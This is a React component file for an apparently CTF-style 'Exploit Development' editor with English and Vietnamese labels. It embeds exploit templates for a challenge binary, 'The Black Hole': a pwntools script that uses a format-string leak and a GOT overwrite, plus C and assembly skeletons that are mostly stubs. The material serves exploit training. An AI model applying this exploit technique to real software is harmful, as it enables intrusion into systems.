import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Copy, Play, RotateCcw, Check } from "lucide-react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useToast } from "@/hooks/use-toast";

const exploitTemplates = {
  python: `#!/usr/bin/env python3
from pwn import *

# Connection setup
p = remote('localhost', 1337)
# p = process('./blackhole')

# Step 1: Leak addresses
payload = b"%p " * 20
p.sendline(payload)
leak = p.recvline()
print(f"Leaked: {leak}")

# Step 2: Calculate offsets
libc_base = int(leak.split()[3], 16) - 0x21b97
binary_base = int(leak.split()[7], 16) - 0x1234
print(f"libc_base: {hex(libc_base)}")
print(f"binary_base: {hex(binary_base)}")

# Step 3: Find gadgets
syscall_gadget = libc_base + 0xcf6c5
exit_got = binary_base + 0x4028

# Step 4: Overwrite GOT
payload = fmtstr_payload(6, {exit_got: syscall_gadget})
p.sendline(payload)

# Step 5: Trigger exploit
p.sendline(b'exit')
p.interactive()`,
  c: `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define LIBC_OFFSET 0x21b97
#define SYSCALL_OFFSET 0xcf6c5

int main() {
    char buffer[512];
    unsigned long libc_base, binary_base;
    unsigned long syscall_gadget, exit_got;
    
    // Step 1: Leak addresses using format string
    char leak_payload[] = "%p %p %p %p %p %p %p %p";
    printf("Sending leak payload...\\n");
    
    // Step 2: Parse leaked addresses
    // ... implementation here ...
    
    // Step 3: Calculate gadget addresses
    syscall_gadget = libc_base + SYSCALL_OFFSET;
    printf("syscall gadget @ 0x%lx\\n", syscall_gadget);
    
    // Step 4: Craft GOT overwrite
    // ... implementation here ...
    
    return 0;
}`,
  asm: `; Assembly exploit skeleton for The Black Hole
section .data
    format_str db "%p %p %p %p", 0xa, 0

section .text
global _start

_start:
    ; Leak addresses via format string
    mov rdi, 1              ; stdout
    lea rsi, [rel format_str]
    mov rdx, 20
    mov rax, 1              ; sys_write
    syscall
    
    ; Read response
    mov rdi, 0              ; stdin
    lea rsi, [rel buffer]
    mov rdx, 256
    mov rax, 0              ; sys_read
    syscall
    
    ; Parse leaked addresses
    ; ... implementation ...
    
    ; Exit
    mov rax, 60
    xor rdi, rdi
    syscall

section .bss
    buffer resb 256`,
};

export function CodeEditor() {
  const [activeTab, setActiveTab] = useState<keyof typeof exploitTemplates>("python");
  const [copied, setCopied] = useState(false);
  const [isRunning, setIsRunning] = useState(false);
  const { t } = useLanguage();
  const { toast } = useToast();

  const handleCopy = () => {
    navigator.clipboard.writeText(exploitTemplates[activeTab]);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: t("Copied to clipboard", "Đã sao chép"),
      description: t("Exploit code copied successfully", "Mã khai thác đã được sao chép thành công"),
    });
  };

  const handleRun = () => {
    setIsRunning(true);
    toast({
      title: t("Running exploit...", "Đang chạy khai thác..."),
      description: t("This is a simulation. In production, this would execute against the target.", "Đây là mô phỏng. Trong thực tế, mã sẽ thực thi với mục tiêu thực."),
    });
    setTimeout(() => setIsRunning(false), 2000);
  };

  const handleReset = () => {
    toast({
      title: t("Code reset", "Đã đặt lại mã"),
      description: t("Editor reset to default template", "Trình soạn thảo đã được đặt lại về mẫu mặc định"),
    });
  };

  return (
    <section className="container mx-auto px-4 py-12">
      <div className="mb-8">
        <h2 className="font-heading text-3xl font-bold tracking-tight mb-2" data-testid="text-exploit-title">
          {t("Exploit Development", "Phát triển khai thác")}
        </h2>
        <p className="text-muted-foreground" data-testid="text-exploit-description">
          {t("Write and test your exploit code in multiple languages", "Viết và kiểm tra mã khai thác của bạn bằng nhiều ngôn ngữ")}
        </p>
      </div>

      <Card>
        <CardHeader className="pb-3">
          <div className="flex items-center justify-between">
            <CardTitle className="text-lg" data-testid="text-editor-title">
              {t("Code Editor", "Trình soạn thảo mã")}
            </CardTitle>
            <div className="flex items-center gap-2">
              <Button
                variant="ghost"
                size="sm"
                onClick={handleCopy}
                className="gap-2"
                data-testid="button-copy-code"
              >
                {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                {t("Copy", "Sao chép")}
              </Button>
              <Button
                variant="ghost"
                size="sm"
                onClick={handleReset}
                className="gap-2"
                data-testid="button-reset-code"
              >
                <RotateCcw className="h-4 w-4" />
                {t("Reset", "Đặt lại")}
              </Button>
              <Button
                size="sm"
                onClick={handleRun}
                disabled={isRunning}
                className="gap-2"
                data-testid="button-run-code"
              >
                <Play className="h-4 w-4" />
                {isRunning ? t("Running...", "Đang chạy...") : t("Run", "Chạy")}
              </Button>
            </div>
          </div>
        </CardHeader>
        <CardContent className="p-0">
          <Tabs value={activeTab} onValueChange={(v) => setActiveTab(v as keyof typeof exploitTemplates)}>
            <div className="border-b px-6">
              <TabsList className="h-auto p-0 bg-transparent">
                <TabsTrigger value="python" className="gap-2" data-testid="tab-python">
                  <Badge variant="outline" className="font-mono text-xs">Python</Badge>
                </TabsTrigger>
                <TabsTrigger value="c" className="gap-2" data-testid="tab-c">
                  <Badge variant="outline" className="font-mono text-xs">C</Badge>
                </TabsTrigger>
                <TabsTrigger value="asm" className="gap-2" data-testid="tab-asm">
                  <Badge variant="outline" className="font-mono text-xs">Assembly</Badge>
                </TabsTrigger>
              </TabsList>
            </div>

            {(Object.keys(exploitTemplates) as Array<keyof typeof exploitTemplates>).map((lang) => (
              <TabsContent key={lang} value={lang} className="m-0">
                <div className="relative">
                  <pre className="overflow-x-auto p-6 font-mono text-sm leading-relaxed bg-muted/30">
                    <code className="text-foreground">{exploitTemplates[lang]}</code>
                  </pre>
                </div>
              </TabsContent>
            ))}
          </Tabs>
        </CardContent>
      </Card>
    </section>
  );
}
